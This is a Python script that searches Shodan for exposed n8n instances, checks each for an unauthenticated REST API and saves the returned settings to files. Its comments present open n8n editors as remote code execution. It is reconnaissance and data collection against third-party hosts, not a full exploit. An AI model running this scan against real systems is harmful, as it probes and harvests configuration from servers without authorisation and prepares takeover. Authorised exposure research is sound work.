#!/usr/bin/env python3
#
# n8n.py
# Search SHODAN for exposed n8n workflow automation instances.
# An open n8n editor allows unauthenticated users to create and run
# workflows — effectively remote code execution on the host.
#
# Author: random_robbie

import os
import shodan
import requests
import sys

# Configuration
API_KEY = "YOUR API KEY"
SEARCH_FOR = 'port:5678 http.html:"n8n"'
VERIFY_PATH = "/rest/settings"
CFG_DIR = "cfg"
session = requests.Session()


def grab_settings(ip, port):
    """Check whether the n8n REST API answers without authentication."""
    print("[*] Testing: " + ip + " on Port: " + port + "[*]\n")
    try:
        url = "http://" + ip + ":" + port + VERIFY_PATH
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Connection": "close",
            "Accept": "application/json",
        }
        response = session.get(url, headers=headers, timeout=15, verify=False)
        if response.status_code == 200 and "settings" in response.text:
            os.makedirs(CFG_DIR, exist_ok=True)
            with open(os.path.join(CFG_DIR, ip + "-n8n.json"), "a") as fh:
                fh.write(response.text + "\n")
            print("[*] Live n8n with unauthenticated API Whooops.. [*]\n")
        else:
            print("[*] n8n requires authentication or is not live. [*]\n")
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        print(e)
        print("[*] Nothing Found on IP:" + ip + " [*]\n")


def main():
    api = shodan.Shodan(API_KEY)
    result = api.search(SEARCH_FOR)
    for service in result["matches"]:
        ip = service["ip_str"]
        port = str(service["port"])
        grab_settings(ip, port)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Ctrl-c pressed ...")
    except Exception as e:
        sys.exit("Error: %s" % e)
